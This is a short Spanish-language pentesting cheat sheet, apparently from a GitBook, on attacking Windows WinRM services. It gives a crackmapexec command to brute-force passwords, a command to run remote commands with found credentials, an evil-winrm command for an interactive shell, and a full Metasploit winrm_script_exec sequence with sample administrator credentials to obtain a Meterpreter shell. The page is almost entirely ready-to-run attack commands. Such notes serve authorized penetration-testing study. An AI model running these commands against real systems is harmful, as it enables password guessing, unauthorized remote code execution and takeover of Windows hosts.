# WinRM

## Fuerza Bruta

### Crackmapexec

Para hacer fuerza bruta con crackmapexec usaremos el siguiente comando:

```bash
crackmapexec winrm 192.168.1.1 -u usuario -p /ruta/diccionario
```

<figure><img src="../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

Una vez con credenciales, podemos ejecuatr comandos a través de cracmapexec:

```
crackmapexec winrm 192.168.1.1 -u usuario -p contraseña -x "comando"
```

<figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

Después, con el uso de un script en ruby, podremos tener acceso a una termina:

```bash
evil-winrm.rb -u usuario -p 'contraseña' -i 192.168.1.1
```

<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

## Obtener una shell meterpreter

Paar el uso de este modulo es necesario tener credenciales:

```perl
msfconsole

use exploit/windows/winrm/winrm_script_exec

set RHOSTS 10.0.0.173

set USERNAME administrator

set PASSWORD tinkerbell

set FORCE_VBS true

exploit
```

<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

